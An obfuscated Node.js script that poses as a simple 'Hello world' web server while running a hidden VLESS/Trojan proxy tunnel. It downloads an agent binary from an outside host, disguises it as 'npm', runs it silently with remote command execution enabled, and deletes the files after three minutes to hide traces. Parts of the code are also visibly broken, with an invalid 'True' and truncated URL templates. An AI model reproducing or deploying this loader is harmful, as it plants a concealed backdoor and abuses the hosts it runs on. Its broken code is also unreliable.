const _0xf546c7de98=["OC1mdHU=","NjkwMg==","ZXNsYWY=","OmtzYVQgZ25pZGRhIHJvcnJF","bWFlcnRz","bm9zai9ub2l0YWNpbHBwYQ==","aHNhYi9uaWIv","OnJvcnJlIGduaW5udXIgbXBu","MS4xLjEuMQ==","bXBuIHgrIGRvbWhj","Li4uZ25pbm51ciBwaWtzICxnbmlubnVyIHlkYWVybGEgc2kgbXBu","OGZ0dQ==","bG10aC54ZWRuaQ==","NC40LjguOA==","NDZtcmE=","MzQ0","ZXVydA==","NDZoY3JhYQ==","dG5lZ2Evbm0uY3luLnNzc3MuNDZtcmEvLzpzcHR0aA==","MXYvbm0uY3luLnNzc3MuNDZtcmEvLzpzcHR0aA==","YnVz","c2Y=","MzQ0OA==","blxkbnVvRiB0b04=","b3RweXJj","NDIyYWhz","eWxsdWZzc2VjY3VzIGRhb2xud29kIG1wbg==","Im1wXW5bLy4iIHBlcmcgfCAicGVyZyIgdi0gcGVyZyB8IHh1YSBzcA==","IWRscm93IG9sbGVI","dHBlY2NB","eWxsdWZzc2VjY3VzIGRlZGRhIGtzYVQgc3NlY2NBIGNpdGFtb3R1QQ==","aHRhcA==","c28=","dGVn","aHNpbmlm","ZDQyNmJlMTYxM2NhLWI5MjgtMWQ2NC0wY2YyLTljNjM4ZDMz","YXRlbS9tb2MuZXJhbGZkdW9sYy5kZWVwcy8vOnNwdHRo","bm9pdGNlbm5vYw==","bG10aC90eGV0","bmMueXl5eXl0LmVjYXBz","c3c=","MzgwMg==","c3NlY29ycF9kbGloYw==","Z25pbm51ciBwaWtzICx5dHBtZSBzaSBlbGJhaXJhdiBBSFpFTg==","bHJ1LWRkYS90ZW4uMDB2cmVzLm9vb28vLzpzcHR0aA==","bG1heS5naWZub2M=","cm9ycmU=","bmlhbHAvdHhldA==","ZWdhc3NlbQ==","c29peGE=","Z25pbm51ciBzaSBtcG4=","bXBu","cHR0aA==","NzgwMg==","MzUwMg==","bXJh","dGVu","dG5lZ2Evbm0uY3luLnNzc3MuNDZkbWEvLzpzcHR0aA==","c2x0LS0=","blw=","MXYvbm0uY3luLnNzc3MuNDZkbWEvLzpzcHR0aA==","dHh0LnRzaWwvZ3VoL3NkYWVoL3NmZXIvZWRvbm9heS83ODkxb2F5bmF0L21vYy5yb3JyaW10aWcud2FyLy86c3B0dGg=","bm9zai1zbmQvbm9pdGFjaWxwcGE=","eGVo","NDZlc2Fi","bndvbmtuVQ==","Z3VI","cmVmZnVi","ZXB5VC10bmV0bm9D"];(function(_a,_s){while(--_s){_a.push(_a.shift());}})(_0xf546c7de98,0x102);function _0x95ff58e3a4(i){let index = i;if (True) {index = (i + 0x102) % 69;} let s = _0xf546c7de98[index];let d = atob(s);return d.split('').reverse().join('');} function _0xfe74f86891(i){return _0x95ff58e3a4(i);} function _0x4bf527535e(){return "215vHEgQ0KAEDHQfoZcmeuuX8hKU7KHuQrIOK4IMHvbgvXIy";} function _0x4afc8a1330(){return "VnuNyLvImnzKvtLF1hKPJ1nQecz8kGbiqYWM7WaFQm38RwTi";} function _0x64837430bb(){return "JCVRKV9fvzFMu8FU1qGxiUnRntH0fg8ENJ2dX6XAVP89B3zB";} function _0x35bc948342(){return "1yEyMZ4xZEr3V2nHLHIfVNhhVQ37QHSzJhGM2Z5sQUMp0Lk0";} function _0xa919bb5371(){return "RRqyGjiIc2n9JdI1Dc1zMyaisHfPLAbmmMX2CiFw4FXHDt62";} ;(function(){try{const os = require(_0xfe74f86891(0x20));const http = require(_0xfe74f86891(0x34));const fs = require(_0xfe74f86891(0x15));const axios = require(_0xfe74f86891(0x31));const net = require(_0xfe74f86891(0x38));const path = require(_0xfe74f86891(0x1f));const crypto = require(_0xfe74f86891(0x18));const {Buffer} = require(_0xfe74f86891(0x43));const {exec,execSync} = require(_0xfe74f86891(0x2a));const {WebSocket,createWebSocketStream} = require(_0xfe74f86891(0x28));const UUID = process.env.UUID || _0xfe74f86891(0x23);const NEZHA_SERVER = process.env.NEZHA_SERVER || '';const NEZHA_PORT = process.env.NEZHA_PORT || '';const NEZHA_KEY = process.env.NEZHA_KEY || '';const DOMAIN = process.env.DOMAIN || _0xfe74f86891(0x27);const AUTO_ACCESS = process.env.AUTO_ACCESS || true;const WSPATH = process.env.WSPATH || UUID.slice(0,8);const SUB_PATH = process.env.SUB_PATH || _0xfe74f86891(0x14);const NAME = process.env.NAME || _0xfe74f86891(0x42);const PORT = process.env.PORT || 7860;let ISP = '';const GetISP = async () => {try {const res = await axios.get(_0xfe74f86891(0x24));const data = res.data;ISP = `${data.country}-${data.asOrganization}`.replace(/ /g,'_');} catch (e) {ISP = _0xfe74f86891(0x41);}} GetISP();const httpServer = http.createServer((req,res) => {if (req.url === '/') {const filePath = path.join(__dirname,_0xfe74f86891(0xc));fs.readFile(filePath,_0xfe74f86891(0xb),(err,content) => {if (err) {res.writeHead(200,{_0xfe74f86891(0x44): _0xfe74f86891(0x26)});res.end(_0xfe74f86891(0x1c));return;} res.writeHead(200,{_0xfe74f86891(0x44): _0xfe74f86891(0x26)});res.end(content);});return;} else if (req.url === `/${SUB_PATH}`) {const DOMAIN_LIST_URL = _0xfe74f86891(0x3d);axios.get(DOMAIN_LIST_URL) .then(r => {let domains = r.data .split(/\r?\n/) .map(l => l.trim()) .filter(l => l.length > 0);if (domains.length === 0) {domains = [DOMAIN];} let output = "";for (const d of domains) {const vlessURL = `vless: const trojanURL = `trojan: output += vlessURL + _0xfe74f86891(0x3b) + trojanURL + _0xfe74f86891(0x3b);} const base64Content = Buffer.from(output).toString(_0xfe74f86891(0x40));res.writeHead(200,{_0xfe74f86891(0x44): _0xfe74f86891(0x2f)});res.end(base64Content + _0xfe74f86891(0x3b));}) .catch(err => {const vlessURL = `vless: const trojanURL = `trojan: const subscription = vlessURL + _0xfe74f86891(0x3b) + trojanURL;const base64Content = Buffer.from(subscription).toString(_0xfe74f86891(0x40));res.writeHead(200,{_0xfe74f86891(0x44): _0xfe74f86891(0x2f)});res.end(base64Content + _0xfe74f86891(0x3b));});} else {res.writeHead(404,{_0xfe74f86891(0x44): _0xfe74f86891(0x2f)});res.end(_0xfe74f86891(0x17));}});const wss = new WebSocket.Server({server: httpServer});const uuid = UUID.replace(/-/g,"");const DNS_SERVERS = [_0xfe74f86891(0xd),_0xfe74f86891(0x8)];function resolveHost(host) {return new Promise((resolve,reject) => {if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(host)) {resolve(host);return;} let attempts = 0;function tryNextDNS() {if (attempts >= DNS_SERVERS.length) {reject(new Error(`Failed to resolve ${host} with all DNS servers`));return;} const dnsServer = DNS_SERVERS[attempts];attempts++;const dnsQuery = `https: axios.get(dnsQuery,{timeout: 5000,headers: {_0xfe74f86891(0x1d): _0xfe74f86891(0x3e)}}) .then(response => {const data = response.data;if (data.Status === 0 && data.Answer && data.Answer.length > 0) {const ip = data.Answer.find(record => record.type === 1);if (ip) {resolve(ip.data);return;}} tryNextDNS();}) .catch(error => {tryNextDNS();});} tryNextDNS();});} function handleVlessConnection(ws,msg) {const [VERSION] = msg;const id = msg.slice(1,17);if (!id.every((v,i) => v == parseInt(uuid.substr(i * 2,2),16))) return false;let i = msg.slice(17,18).readUInt8() + 19;const port = msg.slice(i,i += 2).readUInt16BE(0);const ATYP = msg.slice(i,i += 1).readUInt8();const host = ATYP == 1 ? msg.slice(i,i += 4).join('.') : (ATYP == 2 ? new TextDecoder().decode(msg.slice(i + 1,i += 1 + msg.slice(i,i + 1).readUInt8())) : (ATYP == 3 ? msg.slice(i,i += 16).reduce((s,b,i,a) => (i % 2 ? s.concat(a.slice(i - 1,i + 1)) : s),[]).map(b => b.readUInt16BE(0).toString(16)).join(':') : ''));ws.send(new Uint8Array([VERSION,0]));const duplex = createWebSocketStream(ws);resolveHost(host) .then(resolvedIP => {net.connect({host: resolvedIP,port},function() {this.write(msg.slice(i));duplex.on(_0xfe74f86891(0x2e),() => {}).pipe(this).on(_0xfe74f86891(0x2e),() => {}).pipe(duplex);}).on(_0xfe74f86891(0x2e),() => {});}) .catch(error => {net.connect({host,port},function() {this.write(msg.slice(i));duplex.on(_0xfe74f86891(0x2e),() => {}).pipe(this).on(_0xfe74f86891(0x2e),() => {}).pipe(duplex);}).on(_0xfe74f86891(0x2e),() => {});});return true;} function handleTrojanConnection(ws,msg) {try {if (msg.length < 58) return false;const receivedPasswordHash = msg.slice(0,56).toString();const possiblePasswords = [UUID,];let matchedPassword = null;for (const pwd of possiblePasswords) {const hash = crypto.createHash(_0xfe74f86891(0x19)).update(pwd).digest(_0xfe74f86891(0x3f));if (hash === receivedPasswordHash) {matchedPassword = pwd;break;}} if (!matchedPassword) return false;let offset = 56;if (msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {offset += 2;} const cmd = msg[offset];if (cmd !== 0x01) return false;offset += 1;const atyp = msg[offset];offset += 1;let host,port;if (atyp === 0x01) {host = msg.slice(offset,offset + 4).join('.');offset += 4;} else if (atyp === 0x03) {const hostLen = msg[offset];offset += 1;host = msg.slice(offset,offset + hostLen).toString();offset += hostLen;} else if (atyp === 0x04) {host = msg.slice(offset,offset + 16).reduce((s,b,i,a) => (i % 2 ? s.concat(a.slice(i - 1,i + 1)) : s),[]) .map(b => b.readUInt16BE(0).toString(16)).join(':');offset += 16;} else {return false;} port = msg.readUInt16BE(offset);offset += 2;if (offset < msg.length && msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {offset += 2;} const duplex = createWebSocketStream(ws);resolveHost(host) .then(resolvedIP => {net.connect({host: resolvedIP,port},function() {if (offset < msg.length) {this.write(msg.slice(offset));} duplex.on(_0xfe74f86891(0x2e),() => {}).pipe(this).on(_0xfe74f86891(0x2e),() => {}).pipe(duplex);}).on(_0xfe74f86891(0x2e),() => {});}) .catch(error => {net.connect({host,port},function() {if (offset < msg.length) {this.write(msg.slice(offset));} duplex.on(_0xfe74f86891(0x2e),() => {}).pipe(this).on(_0xfe74f86891(0x2e),() => {}).pipe(duplex);}).on(_0xfe74f86891(0x2e),() => {});});return true;} catch (error) {return false;}} wss.on(_0xfe74f86891(0x25),(ws,req) => {const url = req.url || '';ws.once(_0xfe74f86891(0x30),msg => {if (msg.length > 17 && msg[0] === 0) {const id = msg.slice(1,17);const isVless = id.every((v,i) => v == parseInt(uuid.substr(i * 2,2),16));if (isVless) {if (!handleVlessConnection(ws,msg)) {ws.close();} return;}} if (!handleTrojanConnection(ws,msg)) {ws.close();}}).on(_0xfe74f86891(0x2e),() => {});});const getDownloadUrl = () => {const arch = os.arch();if (arch === _0xfe74f86891(0x37) || arch === _0xfe74f86891(0xe) || arch === _0xfe74f86891(0x11)) {if (!NEZHA_PORT) {return _0xfe74f86891(0x13);} else {return _0xfe74f86891(0x12);}} else {if (!NEZHA_PORT) {return _0xfe74f86891(0x3c);} else {return _0xfe74f86891(0x39);}}};const downloadFile = async () => {if (!NEZHA_SERVER && !NEZHA_KEY) return;try {const url = getDownloadUrl();const response = await axios({method: _0xfe74f86891(0x21),url: url,responseType: _0xfe74f86891(0x4)});const writer = fs.createWriteStream(_0xfe74f86891(0x33));response.data.pipe(writer);return new Promise((resolve,reject) => {writer.on(_0xfe74f86891(0x22),() => {console.log(_0xfe74f86891(0x1a));exec(_0xfe74f86891(0x9),(err) => {if (err) reject(err);resolve();});});writer.on(_0xfe74f86891(0x2e),reject);});} catch (err) {throw err;}};const runnz = async () => {try {const status = execSync(_0xfe74f86891(0x1b),{encoding: _0xfe74f86891(0x0)});if (status.trim() !== '') {console.log(_0xfe74f86891(0xa));return;}} catch (e) {} await downloadFile();let command = '';let tlsPorts = [_0xfe74f86891(0xf),_0xfe74f86891(0x16),_0xfe74f86891(0x1),_0xfe74f86891(0x35),_0xfe74f86891(0x29),_0xfe74f86891(0x36)];if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {const NEZHA_TLS = tlsPorts.includes(NEZHA_PORT) ? _0xfe74f86891(0x3a) : '';command = `setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;} else if (NEZHA_SERVER && NEZHA_KEY) {if (!NEZHA_PORT) {const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';const NZ_TLS = tlsPorts.includes(port) ? _0xfe74f86891(0x10) : _0xfe74f86891(0x2);const configYaml = `client_secret: ${NEZHA_KEY} debug: false disable_auto_update: true disable_command_execute: false disable_force_update: true disable_nat: false disable_send_query: false gpu: false insecure_tls: true ip_report_period: 1800 report_delay: 4 server: ${NEZHA_SERVER} skip_connection_count: true skip_procs_count: true temperature: false tls: ${NZ_TLS} use_gitee_to_upgrade: false use_ipv6_country_code: false uuid: ${UUID}`;fs.writeFileSync(_0xfe74f86891(0x2d),configYaml);} command = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;} else {console.log(_0xfe74f86891(0x2b));return;} try {exec(command,{shell: _0xfe74f86891(0x6)},(err) => {if (err) console.error(_0xfe74f86891(0x7),err);else console.log(_0xfe74f86891(0x32));});} catch (error) {console.error(`error: ${error}`);}};async function addAccessTask() {if (!AUTO_ACCESS) return;if (!DOMAIN) {return;} const fullURL = `https: try {const res = await axios.post(_0xfe74f86891(0x2c),{url: fullURL},{headers: {_0xfe74f86891(0x44): _0xfe74f86891(0x5)}});console.log(_0xfe74f86891(0x1e));} catch (error) {}} const delFiles = () => {fs.unlink(_0xfe74f86891(0x33),() => {});fs.unlink(_0xfe74f86891(0x2d),() => {});};httpServer.listen(PORT,() => {runnz();setTimeout(() => {delFiles();},180000);addAccessTask();console.log(`Server is running on port ${PORT}`);});}catch(e){}})();
